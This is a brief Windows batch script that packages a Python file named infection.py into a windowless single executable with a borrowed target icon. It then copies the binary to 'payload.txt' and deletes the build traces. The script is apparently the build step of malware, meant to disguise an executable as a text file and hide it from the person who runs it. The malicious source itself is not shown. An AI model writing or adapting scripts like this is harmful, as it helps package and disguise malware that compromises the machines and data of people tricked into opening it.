echo off
pip install -r requirements.txt
python -m PyInstaller --onefile --noconsole --icon="target_icon.ico" infection.py
copy .\dist\infection.exe .\payload.txt
del /f /q /s .\dist .\build
rmdir .\dist .\build /q /s
del *.spec
echo on
echo [DONE] Press enter to exit :
pause